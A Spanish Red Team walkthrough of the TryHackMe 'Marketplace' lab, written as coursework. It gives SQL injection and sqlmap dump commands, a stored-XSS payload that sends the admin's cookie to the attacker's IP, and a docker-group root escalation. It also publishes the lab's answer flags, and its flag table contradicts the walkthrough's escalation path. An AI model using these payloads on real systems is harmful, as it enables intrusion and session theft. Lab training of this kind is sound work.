# RETO 1 — TryHackMe: The Marketplace · Paso a paso (Red Team)

**Lab:** https://tryhackme.com/room/marketplace
**Objetivo:** Reconocer, enumerar, explotar y documentar. 3–4 flags de progreso.
**Cadena de ataque:** SQL Injection → XSS almacenado (robo de sesión admin) → credenciales en mensajes → SSH → grupo docker → root.

> 📸 **Regla de oro:** toma captura de CADA comando y su resultado. Nómbralas `mk-01-nmap.png`, `mk-02-gobuster.png`, etc. Estas capturas son el apartado 6 y los anexos del informe (valen 10%).

---

## 0. Preparación

1. En TryHackMe: pulsa **Start Machine** y anota la IP (ej. `10.10.x.x`).
2. Conéctate: **AttackBox** (botón, todo en el navegador) **o** tu Kali con la **VPN de THM**:
   ```bash
   sudo openvpn tu-usuario.ovpn        # si usas Kali propio
   ping <IP_MAQUINA>                   # confirma conectividad
   ```
3. Exporta la IP a una variable para no repetirla:
   ```bash
   export IP=10.10.x.x
   ```

---

## FASE 1 — Reconocimiento y enumeración

### 1.1 Escaneo de puertos
```bash
nmap -sC -sV -p- -T4 -oN nmap-marketplace.txt $IP
```
Resultado esperado (confírmalo):
- **22/tcp** — OpenSSH
- **80/tcp** — nginx (proxy)
- **32768/tcp** — Node.js **Express** → aquí vive la app "The Marketplace"

📸 `mk-01-nmap.png`
📝 *Para el informe:* 3 puertos abiertos; la app corre en el 32768 detrás de un proxy nginx.

### 1.2 Explorar la aplicación web
Abre en el navegador: `http://<IP>:32768`
- Verás "The Marketplace": anuncios, botón de **Sign Up / Login**.
- **Regístrate** una cuenta propia (ej. `test:test123`) y entra.
- Observa funciones: crear anuncio (**New Listing**), ver anuncio (`/item?id=N`), **mensajes**, **reportar** un anuncio.

### 1.3 Enumeración de rutas
```bash
gobuster dir -u http://$IP:32768 -w /usr/share/wordlists/dirb/common.txt -o gobuster-mk.txt
```
Rutas de interés: `/login`, `/signup`, `/new`, `/admin`, `/messages`, `/item`.
📸 `mk-02-gobuster.png`

### 1.4 Analizar autenticación (clave para el informe)
- Inicia sesión y abre las **DevTools del navegador → Application → Cookies**.
- Verás una cookie llamada **`token`** (un JWT). **No tiene el flag `HttpOnly`** → se puede leer desde JavaScript. *(Esta es la mala práctica que habilita el XSS.)*

📝 *Pregunta típica de la sala:* "¿Qué cookie mantiene la sesión?" → **`token`**.

---

## FASE 2 — Explotación controlada

### 2.1 Hallazgo A — SQL Injection en `/item?id=`

Prueba a romper la consulta añadiendo una comilla:
```
http://<IP>:32768/item?id=1'
```
Si da error o comportamiento raro → inyectable. Determina el número de columnas:
```
http://<IP>:32768/item?id=1 ORDER BY 5-- -
```
Sube el número hasta que falle (así sabes cuántas columnas hay, p.ej. 4). Luego UNION para ver posiciones reflejadas:
```
http://<IP>:32768/item?id=0 UNION SELECT 1,2,3,4-- -
```
Vuelca usuarios (ajusta nombres de tabla/columna a lo que encuentres):
```
http://<IP>:32768/item?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
```
Alternativa automatizada (más rápido, documenta ambos si quieres):
```bash
sqlmap -u "http://$IP:32768/item?id=1" --cookie="token=<TU_JWT>" --batch --dbs
sqlmap -u "http://$IP:32768/item?id=1" --cookie="token=<TU_JWT>" --batch -D marketplace --dump
```
Aquí obtienes: usuarios (incluido `admin` y `jake`), una **tabla de mensajes** y, según la sala, **una flag en la BD**.
📸 `mk-03-sqli.png`, `mk-04-sqlmap-dump.png`
📝 **Hallazgo H-01a (SQLi)** → OWASP *Injection*.

### 2.2 Hallazgo B — XSS almacenado → robo de la sesión del administrador

La descripción de un anuncio **no sanitiza HTML/JS**. Hay una función de **reportar** un anuncio que hace que **el administrador lo revise** → tu script se ejecuta en SU navegador.

**Paso 1 — Levanta un listener** para recibir la cookie:
```bash
# en tu Kali/AttackBox
python3 -m http.server 8000
# (o:  nc -lvnp 8000 )
```

**Paso 2 — Crea un anuncio** (New Listing) con este payload en la descripción (pon TU IP de THM, la `10.x`):
```html
<script>document.location='http://<TU_IP>:8000/?c='+document.cookie</script>
```

**Paso 3 — Reporta tu propio anuncio** (botón *Report*). Esto encola la revisión del admin.

**Paso 4 — Espera** unos segundos. En tu listener aparecerá una petición con el **`token` del administrador**:
```
GET /?c=token=eyJhbGciOiJ... (JWT del admin)
```
📸 `mk-05-xss-cookie.png`
📝 **Hallazgo H-01b (XSS almacenado)** → OWASP *Injection* / robo de sesión por cookie sin `HttpOnly`.

### 2.3 Convertirte en administrador
- DevTools → **Application → Cookies** → reemplaza el valor de `token` por el JWT del admin. Refresca.
- (O usa Burp: intercepta y cambia la cabecera `Cookie: token=<JWT_admin>`.)
- Ahora tienes el enlace **Administrator** / accedes a `/admin`.

**→ Flag del panel de administrador** (primera flag `THM{...}`). 📸 `mk-06-admin-flag.png`

### 2.4 Leer mensajes privados → credenciales SSH de jake
En el panel admin puedes **ver mensajes privados** de los usuarios (cambiando el id de usuario o desde la vista admin). Revisa los mensajes del usuario **jake**: contienen su **contraseña SSH** en texto claro.
📸 `mk-07-mensajes-jake.png`
📝 **Hallazgo H-01c (credenciales en texto claro / control de acceso).**

---

## FASE 3 — Acceso al sistema y escalada

### 3.1 SSH como jake (flag de usuario)
```bash
ssh jake@$IP
# contraseña: la encontrada en los mensajes
id
cat user.txt         # → Flag de usuario  THM{...}
```
📸 `mk-08-ssh-jake-userflag.png`

### 3.2 Escalada de privilegios — grupo docker
```bash
id        # observa:  groups=...,docker
```
`jake` pertenece al grupo **docker** = acceso efectivo a root. Monta el disco del host y lee la flag de root:
```bash
# lista imágenes disponibles
docker images
# monta todo el host y entra como root
docker run -v /:/mnt --rm -it <nombre_imagen> chroot /mnt sh
# ya como root:
cat /root/root.txt      # → Flag de root  THM{...}
# (también puedes:  cat /mnt/root/root.txt  sin chroot)
```
Si no sabes el nombre de la imagen, `docker images` te lo da; si no hay, descarga una pequeña: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`.
📸 `mk-09-docker-root.png`

> **GTFOBins:** esta técnica está documentada en https://gtfobins.github.io/gtfobins/docker/ — cítala en el informe.

---

## Checklist de flags (rellena con tus valores reales)

| # | Dónde | Vulnerabilidad que la permitió | Flag (OBTENIDA ✅) |
|---|-------|-------------------------------|------|
| 1 | Panel admin (`/admin`) | XSS almacenado + cookie sin HttpOnly | `THM{c37a63895910e478f28669b048c348d5}` |
| 2 | `/home/jake/user.txt` | SQL Injection → credencial en mensaje → SSH | `THM{c3648ee7af1369676e3e4b15da6dc0b4}` |
| 3 | `/root/root.txt` | sudo + tar wildcard → michael → grupo docker | `THM{d4f76179c80c0dcf46e0f8e43c9abd62}` |

> ✅ **Reto 1 completado el 14/11/2026** — máquina comprometida de principio a fin (anónimo → root). Desarrollo técnico consolidado en `Reto1-Marketplace-COMPLETO.md`.

> La sala tiene varios campos de respuesta; ve marcándolos. **No basta la flag: en el informe explica QUÉ vulnerabilidad la permitió y su impacto.**

---

## Resumen para el informe (apartado 6.1 y 7)

| ID | Hallazgo | OWASP 2025 | Impacto |
|----|----------|------------|---------|
| H-01a | SQL Injection en `id` | Injection | Fuga de BD (usuarios, mensajes, flag) |
| H-01b | XSS almacenado → robo de token admin | Injection / A. de sesión | Suplantación del administrador |
| H-01c | Credenciales en texto claro + grupo docker | Broken Access Control / Misconfig | Acceso SSH y escalada a **root** |

**Contramedidas (para Blue Team y plan de tratamiento):**
- SQLi → consultas parametrizadas, ORM, mínimo privilegio en BD.
- XSS → codificación de salida, **CSP**, cookie `HttpOnly` + `Secure`.
- Credenciales → nunca en texto claro; cifrado/gestor de secretos.
- docker/privesc → quitar a jake del grupo docker; principio de mínimo privilegio.

---

## Si algo falla (troubleshooting)
- **El XSS no devuelve cookie:** confirma que pusiste TU IP de THM (no localhost), que el listener está activo y que **reportaste** el anuncio. El admin tarda unos segundos en "revisar".
- **SQLi no responde:** incluye tu cookie `token` válida en sqlmap; prueba `-- -` (con espacio) como comentario; ajusta el nº de columnas.
- **SSH rechaza:** revisa que copiaste bien la contraseña de los mensajes (sin espacios).
- **docker no existe como comando:** vuelve a confirmar `id`; si no está en el grupo, revisa otras vías de privesc (`sudo -l`, SUID, cron).
